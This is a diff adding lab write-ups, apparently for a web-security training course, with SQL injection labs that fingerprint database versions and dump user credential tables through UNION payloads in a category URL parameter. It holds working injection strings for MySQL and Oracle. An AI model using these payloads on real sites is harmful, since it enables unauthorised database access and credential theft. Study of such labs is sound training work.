@@ -152,3 +152,91 @@ Then we give `SELECT * FROM v$version` to retreive the Oracle database info
 We will get the database info and lab got solved
 
 ![image](https://user-images.githubusercontent.com/33444140/235355211-844b8eaf-5ba2-4887-b105-f5012f86a243.png)
+
+## Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft.
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2'
+
+### Sol :
+
+First we have to check the no of cols and string match :
+    
+        category=Gifts+union+select+null,'a'--
+        
+Then we give `select @@version` for MySQL and Microsoft version and `%23` for `#` to comment out.
+
+        category=Gifts'+union+select+null,@@version%23
+        
+![image](https://user-images.githubusercontent.com/33444140/235367798-c5c89b60-5e10-4f1d-abc5-428882ae8e06.png)
+
+## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+### Sol :
+
+First we list the tables by using `information_schema.tables` query
+
+        category=Pets'+union+select+table_name,+null+from+information_schema.tables--
+        
+![image](https://user-images.githubusercontent.com/33444140/235371041-3593a411-d557-4d5d-96d9-3e26dbdca292.png)
+
+![image](https://user-images.githubusercontent.com/33444140/235371071-f7e2fb65-4ccf-4e26-b648-50724b6417c0.png)
+
+Now we select col names from the table `users_xmoqhn`
+
+        category=Pets'+union+select+column_name,+null+from+information_schema.columns+where+table_name='users_xmoqhn'--
+
+![image](https://user-images.githubusercontent.com/33444140/235371245-20b6e4e0-29cf-4a62-af19-2f36ce1011d1.png)
+![image](https://user-images.githubusercontent.com/33444140/235371259-90e83d8b-5b64-4230-a6b4-eaffb0d20dd2.png)
+
+Now we enumerate all user credentials by above info
+
+        category=Pets'+union+select+username_actmim,+password_kuerfj+from+users_xmoqhn--
+        
+We got the administrator password and logged in to solve the lab.
+
+![image](https://user-images.githubusercontent.com/33444140/235371441-0cb7b2e7-c9a8-4af8-9bff-c71e7a9638d4.png)
+
+![image](https://user-images.githubusercontent.com/33444140/235371476-b2279d4d-38fe-4acd-9ba8-38bd08392722.png)
+
+## Lab 10: SQL injection attack, listing the database contents on Oracle
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user
+
+### Sol :
+
+First we list the tables present
+
+        category=Pets'+union+select+table_name,null+from+all_tables--
+        
+![image](https://user-images.githubusercontent.com/33444140/235371884-fe186a04-9aaa-449d-a377-7c53a4a7f3a2.png)
+
+Then we check for users table
+
+        category=Pets%27+union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_RKONPB%27--
+
+![image](https://user-images.githubusercontent.com/33444140/235372070-0a88e270-3820-4c4e-a42f-ab88800513de.png)
+![image](https://user-images.githubusercontent.com/33444140/235372077-b7822dc8-1201-4780-b2db-9e3ea0c33371.png)
+
+We got the user credentials
+
+![image](https://user-images.githubusercontent.com/33444140/235372208-6d06c55e-3a1b-4a59-8b5d-26818f89c7e0.png)
+
+We logged in as administrator and solved the lab.
+
+![image](https://user-images.githubusercontent.com/33444140/235372244-c8b2cfa7-55c7-40ce-af82-cd74c7ef7509.png)
+
+## Lab 11: 
